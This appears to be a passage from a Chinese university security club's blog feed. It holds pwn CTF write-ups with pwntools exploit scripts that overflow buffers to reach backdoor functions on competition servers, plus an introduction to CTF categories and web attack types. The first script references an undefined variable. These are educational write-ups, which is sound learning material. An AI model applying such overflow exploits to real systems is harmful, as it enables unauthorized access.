class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 121.41.113.245 10002</span><br></pre></td></tr></table></figure><p>​        ELF文件丢入IDA分析，在左侧函数窗口可以找到三个主要函数，</p><p>​        main()：<a href="https://imgchr.com/i/t8s5Je" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/06/01/t8s5Je.png" alt="t8s5Je.png"></a></p><p>​        nothing()：<img src="https://s1.ax1x.com/2020/06/01/t8sIRH.png" alt="t8sIRH.png"></p><p>​        what_is_this()：<img src="https://s1.ax1x.com/2020/06/01/t8sozd.png" alt="t8sozd.png"></p><p>​        发现system后门函数在what_is_this()中，而另外两个函数的正常执行流程是不会调用到这个函数的。</p><p>​        再检查有没有其他漏洞点，发现nothing中，对buf变量的读入会发生溢出。</p><p>​        和上个月的joke一样，利用到了栈帧的基础知识，对局部变量进行溢出，覆盖函数返回地址。</p><p>​        查看buf变量右边的注释可以看到[ebp-38h]，也就是说buf变量距离栈底0x38字节，而在栈帧上，栈底往下的第一个地址是用来存旧的ebp的，栈底往下第二个地址存的就是返回地址，也就是我们要溢出的地址。</p><p><img src="https://s1.ax1x.com/2020/06/01/t8s7QA.png" alt="t8s7QA.png"></p><p>​        因为read函数允许读入0x200个字节，长度足够，所以我们用0x38个’a’填满buf，用p32(0)填满旧ebp，再用what_is_this()的地址填充原来的返回地址，这样nothing函数执行结束后，系统就会跳转到what_is_this开始执行。</p><p>​        脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">"121.41.113.245"</span>,<span class="number">10002</span>)</span><br><span class="line">elf = ELF(<span class="string">'./rop_still'</span>)</span><br><span class="line">what_addr = <span class="number">0x08048562</span></span><br><span class="line">p.recvuntil(<span class="string">"Not thing here..."</span>)</span><br><span class="line">payload=<span class="string">'A'</span>*<span class="number">0x38</span>+p32(<span class="number">0</span>)+p32(addr)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="guess"><a href="#guess" class="headerlink" title="guess"></a>guess</h3><p>​        在Ubuntu终端执行命令来远程运行程序。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 121.41.113.245 10000</span><br></pre></td></tr></table></figure><p>​        发现貌似是一个猜数字的程序。</p><p><a href="https://imgchr.com/i/t8srRJ" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/06/01/t8srRJ.png" alt="t8srRJ.png"></a></p><p>​        丢ida分析一波。主要函数只有main函数。</p><p><img src="https://s1.ax1x.com/2020/06/01/t8ssz9.png" alt="t8ssz9.png"></p><p>​        在程序中可以看到，v8变量是用随机数函数rand()函数生成的，每次的值都不一样。</p><p>​        此处要注意<a href="https://www.cnblogs.com/guihailiuli/p/4154416.html" target="_blank" rel="noopener">伪随机数的知识</a>。</p><p>​        大致的意思是，srand()和rand()函数可以配合使用生成随机数，rand()用来返回生成的值。rand()函数虽然能产生随机数，但是是通过srand的参数seed经过一定算法得出来的。换句话说，在函数算法不变的前提下，我们使用同样的参数seed，就可以得出同样的随机数。</p><p><img src="https://s1.ax1x.com/2020/06/01/t8s6MR.png" alt="t8s6MR.png"></p><p>​        同样的自变量，同样的函数，就会得出同样的因变量。</p><p>​        所以srand()函数不变的前提下，我们只需要改变seed的值就可以控制最终得出的随机数。</p><p>​        在程序中我们看到srand()的参数，也就是seed，用的是a[0]，而a[0]在main函数第12行处被一个未初始化的变量赋值过，也就是说是个不确定的值。我们要做的就是覆写这个a[0]。</p><p>​        我们假设a[0]等于1，再求出来生成的随机数是多少。</p><p>​        写个C程序用srand函数算一算：</p><p><img src="https://s1.ax1x.com/2020/06/01/t8sWdK.png" alt="t8sWdK.png"></p><p><a href="https://imgchr.com/i/t8sfIO" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/06/01/t8sfIO.png" alt="t8sfIO.png"></a></p><p>​        seed等于1是，rand()%100得出的结果为83。</p><p>​        双击a变量，发现它位于程序的bss段，也就是说这是一个全局变量。</p><p>!<img src="https://s1.ax1x.com/2020/06/01/t8scs1.png" alt="t8scs1.png"></p><p>​        而在它上方有另一个全局变量b，这个变量在main函数中被用来输入姓名。</p><p><img src="https://s1.ax1x.com/2020/06/01/t8sgqx.png" alt="t8sgqx.png"></p><p>​        我们可以用read函数填充b变量，溢出到a，覆盖a[0]为1。</p><p><img src="https://s1.ax1x.com/2020/06/01/t8sRZ6.png" alt="t8sRZ6.png"></p><p>​        b的地址为：0x08049B4C，a的地址为：0x08049B60。计算可知，两者相距0x14字节。</p><p>​        脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">"121.41.113.245"</span>,<span class="number">10000</span>)</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x14</span> + p32(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">'First tell me who you are : \n'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">'Do you know what I am thinking?\n'</span>)</span><br><span class="line">p.sendline(str(<span class="number">83</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>武汉科技大学信息安全协会</title>
      <link href="2020/04/16/introduction/"/>
      <url>2020/04/16/introduction/</url>
      
        <content type="html"><![CDATA[<p>讲真的，最舒服的就是进去的那一下，不进去永远体会不到在里面的快感和激情</p><a id="more"></a><p>光看着信安协会不进是感受不到快感的，先进来看看介绍吧</p><h1 id="0x00-关于WUST-AIS"><a href="#0x00-关于WUST-AIS" class="headerlink" title="0x00 . 关于WUST-AIS"></a>0x00 . 关于WUST-AIS</h1><p>信息安全协会创立于2017年9月，响应国家网络安全的人才需要，协会以CTF（夺旗赛）竞赛为主，研究网络安全，逆向工程，二进制漏洞利用等方向，还包含管理安全，安全开发，社会工程学等研究方向，是一个覆盖面极广的学术与技术性的组织，是武科大最优秀的黑客集中地，低调且有条不紊地发展着。</p><p>在这里，你可能会涉及到或学到：</p><ul><li>不同于程序员的思考思维</li><li>学校可能不会学到的知识或者骚操作</li><li>强大的学习能力以及 Google 能力</li><li>很骚但什么都要学的Web安全</li><li>以逆向思维去分析代码和逻辑的逆向工程</li><li>象征着获取权限的二进制安全 “Pwn”</li><li>不但什么都要学且脑洞要大的 Misc 杂项类</li><li>像破解你心爱的人空间密码一样的密码学</li></ul><h1 id="0x01-关于CTF"><a href="#0x01-关于CTF" class="headerlink" title="0x01 . 关于CTF"></a>0x01 . 关于CTF</h1><p>​        本栏内容摘自诸葛建伟老师在 i 春秋上的公开视频「CTF 的过去、现在与未来」。</p><h2 id="CTF-的起源"><a href="#CTF-的起源" class="headerlink" title="CTF 的起源"></a>CTF 的起源</h2><p>​        CTF 的前身是传统黑客之间网络技术比拼的游戏，起源于 1996 年第四届 DEFCON。</p><h2 id="早期-CTF-竞赛"><a href="#早期-CTF-竞赛" class="headerlink" title="早期 CTF 竞赛"></a>早期 CTF 竞赛</h2><p>​        最开始的 CTF 比赛（1996 年-2001 年），没有明确的比赛规则，没有专业搭建的比赛平台与环境。由参数队伍各自准备比赛目标（自己准备的比赛目标自己防守并要尝试攻破对方提供的比赛目标）。而组织者大都只是一些非专业的志愿者，接受参赛队伍请求手工计分。</p><p>​        没有后台自动系统支持和裁判技术能力认定，计分延迟和误差以及不可靠的网络和不当的配置，导致比赛带来了极大的争论与不满。</p><h2 id="「现代」CTF-竞赛"><a href="#「现代」CTF-竞赛" class="headerlink" title="「现代」CTF 竞赛"></a>「现代」CTF 竞赛</h2><p>​        由专业队伍承担比赛平台、命题、赛事组织以及自动化积分系统。参赛队伍需提交参赛申请，由 DEFCON 会议组织者们进行评选。</p><p>​        就 LegitBS 组织的三年 DEFCON CTF 比赛而言，有以下突出特点：</p><ul><li><p>比赛侧重于对计算机底层和系统安全核心能力，Web 漏洞攻防技巧完全不受重视。</p></li><li><p>竞赛环境趋向多 CPU 指令架构集，多操作系统，多编程语言。</p></li><li><p>采用「零和」计分规则。</p></li><li><p>团队综合能力考研：逆向分析、漏洞挖掘、漏洞利用、漏洞修补加固、网络流量分析、系统安全运维以及面向安全的编程调试。</p></li></ul><h1 id="0x02-关于CTF的主要方向"><a href="#0x02-关于CTF的主要方向" class="headerlink" title="0x02 . 关于CTF的主要方向"></a>0x02 . 关于CTF的主要方向</h1><h2 id="A-MISC-简介"><a href="#A-MISC-简介" class="headerlink" title="A.MISC 简介"></a>A.MISC 简介</h2><p>​        Misc是英文miscellaneous的前四个字母，杂项、混合体、大杂烩的意思。</p><p>​        在Misc这一方向中，主要介绍以下的知识：</p><ul><li><p>Recon(信息搜集)</p><p>  ​    主要介绍一些获取信息的渠道和一些利用Baidu &amp;&amp; Google等搜索引擎的技巧</p></li><li><p>Encode(编码转换)</p><p>  ​    主要介绍在CTF比赛中一些常见的编码形式以及转换的技巧和常见方式</p></li><li><p>Forensic &amp;&amp; Stego(数字取证 &amp;&amp; 隐写分析)</p><p>  ​    隐写取证是Misc中最为重要的一块，包括文件分析、隐写、内存镜像分析和流量抓包分析等等，涉及巧妙的编码、隐藏数据、层层嵌套的文件中的文件，灵活利用搜索引擎获取所需要的信息等等。</p><p>  ​    CTF中Misc与现实中的取证不同,现实中的取证很少会涉及巧妙的编码加密，数据隐藏，被分散嵌套在各处的文件字符串,或是其他脑洞类的Chanllenge。很多时候是去精心恢复一个残损的文件,挖掘损坏硬盘中的蛛丝马迹,或者从内存镜像中抽取有用的信息。</p><p>  ​    现实的取证需要从业者能够找出间接的恶意行为证据：攻击者攻击系统的痕迹，或是内部威胁行为的痕迹。实际工作中计算机取证大部分是从日志、内存、文件系统中找出犯罪线索，并找出与文件或文件系统中数据的关系。而流量取证比起内容数据的分析，更注重元数据的分析，也就是当前不同端点间常用TLS加密的网络会话。</p><p>  ​    MISC 是切入 CTF 竞赛领域，，培养兴趣的最佳入口。MISC 考察基本知识，对安全技能的各个层面都有不同程度的涉及，可以在很大程度上启发思维。</p></li></ul><h2 id="B-密码学-简介"><a href="#B-密码学-简介" class="headerlink" title="B.密码学 简介"></a>B.密码学 简介</h2><p>​        密码学（Cryptography）一般可分为古典密码学和现代密码学。</p><p>​        其中，古典密码学，作为一种实用性艺术存在，其编码和破译通常依赖于设计者和敌手的创造力与技巧，并没有对密码学原件进行清晰的定义。其主要包含以下几个方面</p><ul><li><p>单表替换加密</p></li><li><p>多表替换加密</p></li><li><p>奇奇怪怪的加密方式</p><p>  ​    而现代密码学则起源于 20 世纪末出现的大量相关理论，这些理论使得现代密码学成为了一种可以系统而严格地学习的科学。现代密码学又可以简单的分为以下几个方面</p></li><li><p>对称密码，以 DES，AES，RC4 为代表</p></li><li><p>非对称密码，以 RSA，椭圆曲线加密为代表</p></li><li><p>HASH，以 MD5，SHA1，SHA512 等为代表</p></li><li><p>数字签名，以 RSA 签名，ElGamal 签名，DSA 签名为代表</p><p>  其加密方式主要有两种方式</p></li><li><p>块加密</p></li><li><p>流加密</p><p>  一般来说，密码设计者的基本想法是确保密码框架的</p></li><li><p>保密性</p></li><li><p>完整性</p></li><li><p>可用性</p></li><li><p>不可否认性</p><p>  ​    其中，前三者又称为 CIA 三元组。</p></li></ul><p>​        而对于密码破解者来说，一般都是要想办法识别密码算法，然后利用暴力破解方法或者密码框架的漏洞进行破解。当然，也有可能是处于希望构造虚假的哈希值或者签名来绕过相应的检测。</p><p>​        一般来说，我们都会假设攻击者知道要攻破的密码体制，一般来说会有如下几种攻击类型</p><ul><li>唯密文攻击</li><li>已知明文攻击</li><li>选择明文攻击</li><li>选择密文攻击</li></ul><h2 id="C-WEB-简介"><a href="#C-WEB-简介" class="headerlink" title="C.WEB 简介"></a>C.WEB 简介</h2><blockquote><p>随着 WEB 2.0、社交网络、微博等等一系列新型的互联网产品的诞生，基于 WEB 环境的互联网应用越来越广泛，企业信息化的过程中各种应用都架设在 WEB 平台上，WEB 业务的迅速发展也引起黑客们的强烈关注，接踵而至的就是 WEB 安全威胁的凸显，黑客利用网站操作系统的漏洞和 WEB 服务程序的漏洞得到 WEB 服务器的控制权限，轻则篡改网页内容，重则窃取重要内部数据，更为严重的则是在网页中植入恶意代码，使得网站访问者受到侵害。</p></blockquote><p>在 CTF 竞赛中，WEB 也是占比重很大的一个方向之一，WEB 类的题目种类繁多，知识点细碎，时效性强，能紧跟时下热点漏洞，贴近实战。</p><p>WEB 类的题目包括但不限于：SQL 注入、XSS 跨站脚本、CSRF 跨站请求伪造、文件上传、文件包含、框架安全、PHP 常见漏洞、代码审计等。</p><p><strong>SQL 注入</strong></p><p>通过在用户可控参数中注入 SQL 语法，破坏原有 SQL 结构，达到编写程序时意料之外结果的攻击行为。其成因可以归结为以下两个原因叠加造成的： 1. 程序编写者在处理应用程序和数据库交互时，使用字符串拼接的方式构造 SQL 语句 2. 未对用户可控参数进行足够的过滤便将参数内容拼接进入到 SQL 语句中</p><p><strong>XSS 跨站脚本攻击</strong></p><p>跨站脚本攻击（Cross Site Scripting），为不和层叠样式表（Cascading Style Sheets，CSS）的缩写混淆，故将跨站脚本攻击缩写为 XSS。恶意攻击者往 WEB 页面里插入恶意 HTML 代码，当用户浏览该页之时，嵌入其中 Web 里面的 HTML 代码会被执行，从而达到恶意攻击用户的特殊目的。</p><p><strong>命令执行</strong></p><p>当应用需要调用一些外部程序去处理内容的情况下，就会用到一些执行系统命令的函数。如 PHP 中的 system 、 exec 、 shell_exec 等，当用户可以控制命令执行函数中的参数时，将可以注入恶意系统命令到正常命令中，造成命令执行攻击。这里还是主要以 PHP 为主介绍命令执行漏洞，Java 等应用的细节待补充。</p><p><strong>文件包含</strong></p><p>如果允许客户端用户输入控制动态包含在服务器端的文件，会导致恶意代码的执行及敏感信息泄露，主要包括本地文件包含和远程文件包含两种形式。</p><p><strong>CSRF 跨站请求伪造</strong></p><p>跨站请求伪造（Cross-Site Request Forgery，CSRF）是一种使已登录用户在不知情的情况下执行某种动作的攻击。因为攻击者看不到伪造请求的响应结果，所以 CSRF 攻击主要用来执行动作，而非窃取用户数据。当受害者是一个普通用户时，CSRF 可以实现在其不知情的情况下转移用户资金、发送邮件等操作；但是如果受害者是一个具有管理员权限的用户时 CSRF 则可能威胁到整个 WEB 系统的安全。</p><p><strong>SSRF 服务器端请求伪造</strong></p><p>SSRF（Server-Side Request Forgery：服务器端请求伪造）是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF 攻击的目标是从外网无法访问的内部系统。</p><p><strong>文件上传</strong></p><p>在网站的运营过程中，不可避免地要对网站的某些页面或者内容进行更新，这时便需要使用到网站的文件上传的功能。如果不对被上传的文件进行限制或者限制被绕过，该功能便有可能会被利用于上传可执行文件、脚本到服务器上，进而进一步导致服务器沦陷。</p><p><strong>点击劫持</strong></p><p>Clickjacking（点击劫持）是由互联网安全专家罗伯特·汉森和耶利米·格劳斯曼在 2008 年首创的。</p><p>是一种视觉欺骗手段，在 WEB 端就是 iframe 嵌套一个透明不可见的页面，让用户在不知情的情况下，点击攻击者想要欺骗用户点击的位置。</p><p>由于点击劫持的出现，便出现了反 frame 嵌套的方式，因为点击劫持需要 iframe 嵌套页面来攻击。</p><p>下面代码是最常见的防止 frame 嵌套的例子：</p><p>if(top.location!=location) top.location=self.location;</p><p><strong>VPS 虚拟专用服务器</strong></p><p>VPS（Virtual Private Server 虚拟专用服务器）技术，将一部服务器分割成多个虚拟专享服务器的优质服务。实现 VPS 的技术分为容器技术，和虚拟化技术。在容器或虚拟机中，每个 VPS 都可分配独立公网 IP 地址、独立操作系统、实现不同 VPS 间磁盘空间、内存、CPU 资源、进程和系统配置的隔离，为用户和应用程序模拟出独占使用计算资源的体验。VPS 可以像独立服务器一样，重装操作系统，安装程序，单独重启服务器。VPS 为使用者提供了管理配置的自由，可用于企业虚拟化，也可以用于 IDC 资源租用。</p><p>IDC 资源租用，由 VPS 提供商提供。不同 VPS 提供商所使用的硬件 VPS 软件的差异，及销售策略的不同，VPS 的使用体验也有较大差异。尤其是 VPS 提供商超卖，导致实体服务器超负荷时，VPS 性能将受到极大影响。相对来说，容器技术比虚拟机技术硬件使用效率更高，更易于超卖，所以一般来说容器 VPS 的价格都高于虚拟机 VPS 的价格。</p><p><strong>条件竞争</strong></p><p>条件竞争漏洞是一种服务器端的漏洞，由于服务器端在处理不同用户的请求时是并发进行的，因此，如果并发处理不当或相关操作逻辑顺序设计的不合理时，将会导致此类问题的发生。</p><p><strong>XXE</strong></p><p>XXE Injection 即 XML External Entity Injection，也就是 XML 外部实体注入攻击.漏洞是在对非安全的外部实体数据进⾏行处理时引发的安全问题。</p><p>在 XML 1.0 标准里，XML 文档结构⾥里定义了实体（entity）这个概念.实体可以通过预定义在文档中调用，实体的标识符可访问本地或远程内容.如果在这个过程中引入了「污染」源，在对 XML 文档处理后则可能导致信息泄漏等安全问题。</p><p><strong>XSCH</strong></p><p>由于网站开发者在使用 flash、Silverlight 等进行开发的过程中的疏忽，没有对跨域策略文件（crossdomain.xml）进行正确的配置导致问题产生。 例如：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;/<span class="name">cross-domain-policy</span>&gt;</span></span><br></pre></td></tr></table></figure><p>因为跨域策略文件配置为 *，也就指任意域的 flash 都可以与它交互，导致可以发起请求、获取数据。</p><p><strong>越权（功能级访问缺失）</strong></p><p>越权漏洞是 WEB 应用程序中一种常见的安全漏洞。它的威胁在于一个账户即可控制全站用户数据。当然这些数据仅限于存在漏洞功能对应的数据。越权漏洞的成因主要是因为开发人员在对数据进行增、删、改、查询时对客户端请求的数据过分相信而遗漏了权限的判定。所以测试越权就是和开发人员拼细心的过程。 敏感信息泄露</p><p>敏感信息指不为公众所知悉，具有实际和潜在利用价值，丢失、不当使用或未经授权访问对社会、企业或个人造成危害的信息。包括：个人隐私信息、业务经营信息、财务信息、人事信息、IT 运维信息等。 泄露途径：Github、百度文库、Google code、网站目录等。 错误的安全配置</p><p>Security Misconfiguration：有时候，使用默认的安全配置可能会导致应用程序容易遭受多种攻击。在已经部署的应用、WEB 服务器、数据库服务器、操作系统、代码库以及所有和应用程序相关的组件中，都应该使用现有的最佳安全配置，这一点至关重要。</p><p><strong>WAF</strong></p><p>Web 应用防护系统（也称：网站应用级入侵防御系统。英文：Web Application Firewall，简称：WAF）。利用国际上公认的一种说法：WEB 应用防火墙是通过执行一系列针对 HTTP/HTTPS 的安全策略来专门为 WEB 应用提供保护的一款产品。</p><p><strong>IDS</strong></p><p>IDS 是英文 Intrusion Detection Systems 的缩写，中文意思是「入侵检测系统」。专业上讲就是依照一定的安全策略，通过软、硬件，对网络、系统的运行状况进行监视，尽可能发现各种攻击企图、攻击行为或者攻击结果，以保证网络系统资源的机密性、完整性和可用性。做一个形象的比喻：假如防火墙是一幢大楼的门锁，那么 IDS 就是这幢大楼里的监视系统。一旦小偷爬窗进入大楼，或内部人员有越界行为，只有实时监视系统才能发现情况并发出警告。</p><p><strong>IPS</strong></p><p>入侵防御系统（IPS：Intrusion Prevention System）是电脑网络安全设施，是对防病毒软件（Antivirus Programs）和防火墙（Packet Filter，Application Gateway）的补充。入侵预防系统（Intrusion-prevention system）是一部能够监视网络或网络设备的网络资料传输行为的计算机网络安全设备，能够即时的中断、调整或隔离一些不正常或是具有伤害性的网络资料传输行为。</p><p>参考资料： WEB 渗透 Wiki</p><h2 id="D-逆向工程-简介"><a href="#D-逆向工程-简介" class="headerlink" title="D.逆向工程 简介"></a>D.逆向工程 简介</h2><p>指对软件的结构,流程,算法,代码等进行逆向拆解和分析</p><p><strong>研究目标</strong></p><p>导出软件产品的源代码,设计原理,结构,算法,处理过程,运行方法及相关文档等</p><p><strong>应用领域</strong></p><p>主要应用于 软件维护 ， 软件破解 ， 漏洞挖掘 ， 恶意代码分析 逆向分析流</p><ul><li>研究保护方法,去除保护功能</li><li>反汇编目标软件,跟踪,分析代码功能</li><li>生成目标软件的设计思想,架构,算法等相关文档</li><li>注入代码,开发出更完善的应用软件</li></ul><p><strong>软件逆向的历史</strong></p><blockquote><p>20 世纪 60 年代 为挽救第二代计算机软件及加速第三代计算机软件开发,美国研制专用反编译工具进行软件移植 1993 年 Chikofs等人于发起逆向工程会议并每年举行一次,研究和讨论软件逆向工程的问题,技术及其支持工具 80 年代后期到 90 年代 关于解决软件逆向工程和软件版权的矛盾基本上有了结果,各国纷纷针对软件逆向工程进行立法,不是约束而是规范该领域的研究工作 2007 年 1 月 17 日 最高人民法院发布司法解释: 通过自行开发研制或者反向工程等方式获得的商业秘密,将不被认定为反不正当竞争法有关条款规定的侵犯商业秘密行为。</p></blockquote><p><strong>逆向研究的目的和意义</strong></p><ul><li>充分利用和改造现有软件,对现有软件进行再设计,再工程,使软件功能得到大幅提高以满足用户的需要</li><li>通过软件逆向工程将过时的软件系统转化为易演化系统</li><li>破除商业闭源,技术保护(这阻碍了软件科学的发展).开放源代码</li></ul><p><strong>CTF竞赛中的逆向</strong></p><blockquote><p>涉及Windows/Linux/Android平台的多种编程技术，要求利用常用工具对源代码及二进制文件进行逆向分析，掌握Android移动应用APK文件的逆向分析，掌握加解密、内核编程、算法、反调试和代码混淆技术。 —— 《全国大学生信息安全竞赛参赛指南》</p></blockquote><p><strong>要求</strong></p><ul><li>熟悉如操作系统,汇编语言,加解密等相关知识</li><li>具有丰富的多种高级语言的编程经验</li><li>熟悉多种编译器的编译原理</li><li>较强的程序理解和逆向分析能力</li></ul><h2 id="E-PWN-简介"><a href="#E-PWN-简介" class="headerlink" title="E.PWN 简介"></a>E.PWN 简介</h2><p>​        PWN在黑客俚语中代表着攻破，取得权限，在CTF比赛中它代表着溢出类的题目，其中常见类型溢出漏洞有栈溢出、堆溢出。主要考察参数选手对漏洞的利用能力。CTF中的pwn大部分是指缓冲区溢出。</p><blockquote><p>缓冲区溢出是一种非常普遍、非常危险的漏洞，在各种操作系统、应用软件中广泛存在。利用缓冲区溢出攻击，可以导致程序运行失败、系统宕机、重新启动等后果。更为严重的是，可以利用它执行非授权指令，甚至可以取得系统特权，进而进行各种非法操作。</p></blockquote><p>​        而目前CTF中PWN题目Linux平台占多数，少数出现内核pwn，windows pwn等。</p><p>​        pwn需要一定的基础才能驾驭，比起其他方向，该方向”看起来”更加令人不敢接近，所涉及到的如下:</p><ul><li><p>计算机系统原理</p></li><li><p>汇编语言</p></li><li><p>一定的逆向能力</p></li><li><p>挖掘可以利用漏洞的经验</p></li></ul><pre><code>考察内容包括:</code></pre><ul><li><p>栈溢出</p></li><li><p>ROP</p></li><li><p>堆溢出</p></li><li><p>格式化字符串</p></li></ul><h1 id="0x03-最后"><a href="#0x03-最后" class="headerlink" title="0x03 最后"></a>0x03 最后</h1><p>如果你也想女神对你投向无比崇拜的眼光</p><p>如果你也想你的意中人在茫茫人海中发现你</p><p>如果 …</p><p>可惜没如果，这就是命。</p><p>Join us, make your life(maybe others’) controllable.</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AIS </tag>
            
            <tag> CTF </tag>
            
            <tag> about </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WUST-CTF 2020 官方 Writeup</title>
      <link href="2020/03/30/wctf2020_official_wp/"/>
      <url>2020/03/30/wctf2020_official_wp/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>去年12月份左右，突然彼得一激灵，想弄个萌新赛给大一大二的打打，不然大家平时都没啥机会打比赛（毕竟现在比赛都是把萌新骗进来杀，一点不友好）。然后开始想赛制，奖励，策划，出题… 经过了各种申请和修改，终于申请成功了，也就有了学校的第一个CTF。一开始没有想到会有那么多外校的师傅来打，所以在环境，题目设置上会出现一些大大小小的问题，加上题目可能对很多师傅来说太简单了，希望师傅们见谅。感谢各位师傅的捧场，你们认真做就是对出题人最好的评价。感谢各路师傅投稿的 writeup，这篇 writeup 作为官方 writeup，就以出题人的角度来写。</p><a id="more"></a><h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="getshell-33-solves"><a href="#getshell-33-solves" class="headerlink" title="getshell - 33 solves"></a>getshell - 33 solves</h2><blockquote><p>Author: ColdShield</p></blockquote><p>flag:<code>wctf2020{E@sy_get_shel1}</code></p><p><strong>程序分析</strong></p><p><img src="https://s1.ax1x.com/2020/03/30/GndqxJ.png" alt="GndqxJ.png"></p><p>开启栈不可执行，没有 canary，PIE 保护</p><p><img src="https://s1.ax1x.com/2020/03/30/Gndza6.png" alt="Gndza6.png"></p><p>具体漏洞在<code>vulnerable</code>函数中，栈溢出，溢出<code>0x20-0x18</code>可覆盖8个字节，即刚好覆盖到返回地址，由于程序内置后门</p><p><img src="https://s1.ax1x.com/2020/03/30/GndOM9.png" alt="GndOM9.png"></p><p>返回地址设置成<code>0x0804851B</code>即可</p><p><strong>EXP</strong></p><p>和之前换乐赛一样，我的exp都是一个demo copy出来的，主要看<code># todo here</code>下面的内容就好</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">binary = <span class="string">'getshell'</span><span class="comment">#binary's name here</span></span><br><span class="line">context.binary = binary<span class="comment">#context here</span></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">pty = process.PTY</span><br><span class="line">p = process(binary, aslr = <span class="number">1</span>, stdin=pty, stdout=pty)<span class="comment">#process option here</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">Host ='0.0.0.0'</span></span><br><span class="line"><span class="string">Port =2333</span></span><br><span class="line"><span class="string">p = remote(Host,Port)</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">elf = ELF(binary)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">my_u64 = <span class="keyword">lambda</span> x: u64(x.ljust(<span class="number">8</span>, <span class="string">'\0'</span>))</span><br><span class="line">my_u32 = <span class="keyword">lambda</span> x: u32(x.ljust(<span class="number">4</span>, <span class="string">'\0'</span>))</span><br><span class="line">global_max_fast=<span class="number">0x3c67f8</span></span><br><span class="line">codebase = <span class="number">0x555555554000</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">loginfo</span><span class="params">(what=<span class="string">''</span>,address=<span class="number">0</span>)</span>:</span></span><br><span class="line">log.info(<span class="string">"\033[1;36m"</span> + what + <span class="string">'-----&gt;'</span> + hex(address) + <span class="string">"\033[0m"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># todo here</span></span><br><span class="line">p.recvuntil(<span class="string">"\\ \n"</span>)</span><br><span class="line">p.send(<span class="string">'a'</span>*(<span class="number">0x18</span>+<span class="number">4</span>)+p32(<span class="number">0x0804851B</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="getshell2-7-solves"><a href="#getshell2-7-solves" class="headerlink" title="getshell2 - 7 solves"></a>getshell2 - 7 solves</h2><blockquote><p>Author: ColdShield</p></blockquote><p>flag:<code>wctf2020{Sh_Als0_w0rks}</code></p><p><strong>程序分析</strong></p><p><img src="https://s1.ax1x.com/2020/03/30/GndxVx.png" alt="GndxVx.png"></p><p>和前面那个程序的保护一样</p><p><img src="https://s1.ax1x.com/2020/03/30/Gndb24.png" alt="Gndb24.png"></p><p>具体漏洞在<code>vulnerable</code>函数中，栈溢出，溢出<code>0x24-0x18</code>可覆盖0xC个字节，可覆盖返回地址和函数第一个参数</p><p>但是程序的后门是这样的</p><p><img src="https://s1.ax1x.com/2020/03/30/GndHGF.png" alt="GndHGF.png"></p><p><img src="https://s1.ax1x.com/2020/03/30/Gnd7PU.png" 